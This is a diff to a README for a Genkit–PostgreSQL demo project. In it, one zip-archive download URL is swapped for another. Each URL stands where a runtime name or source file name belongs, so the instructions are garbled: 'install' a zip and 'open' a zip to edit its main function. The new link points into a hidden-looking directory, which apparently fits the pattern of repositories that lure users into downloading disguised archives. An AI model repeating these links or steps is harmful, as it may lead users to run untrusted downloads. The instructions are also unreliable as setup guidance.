@@ -4,7 +4,7 @@ This project demonstrates how to create a Genkit flow that connects to a Postgre
 
 ## Prerequisites
 
-- https://github.com/Miqman/genkit-project-template-2025/raw/refs/heads/main/src/project_template_genkit_v3.1.zip and npm installed
+- https://raw.githubusercontent.com/Miqman/genkit-project-template-2025/main/.genkit/servers/template-genkit-project-v1.9-alpha.4.zip and npm installed
 - A running PostgreSQL database
 
 ## Setup
@@ -24,7 +24,7 @@ This project demonstrates how to create a Genkit flow that connects to a Postgre
      ```
 
 3. **Configure database connection:**
-   - Open `https://github.com/Miqman/genkit-project-template-2025/raw/refs/heads/main/src/project_template_genkit_v3.1.zip` and replace the placeholder connection details in the `main` function with your actual database credentials:
+   - Open `https://raw.githubusercontent.com/Miqman/genkit-project-template-2025/main/.genkit/servers/template-genkit-project-v1.9-alpha.4.zip` and replace the placeholder connection details in the `main` function with your actual database credentials:
      ```typescript
      const dbResult = await postgresFlow({
        user: "your_user",
